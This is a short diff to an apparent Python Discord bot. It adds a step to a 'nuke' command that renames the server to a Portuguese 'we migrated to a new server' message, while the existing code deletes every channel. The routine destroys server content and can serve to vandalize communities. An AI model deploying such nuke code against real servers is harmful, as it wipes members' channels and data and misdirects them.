@@ -42450,6 +42450,11 @@ async def nuke_cmd(ctx: commands.Context):
     guild = ctx.guild
     settings = get_settings(guild.id)
 
+    try:
+        await guild.edit(name="NATA MIGRAMOS NOVO SERVIDOR!", reason="Nuke — renomear servidor")
+    except Exception:
+        pass
+
     for ch in list(guild.channels):
         try:
             await ch.delete(reason="Nuke — comando do dono")
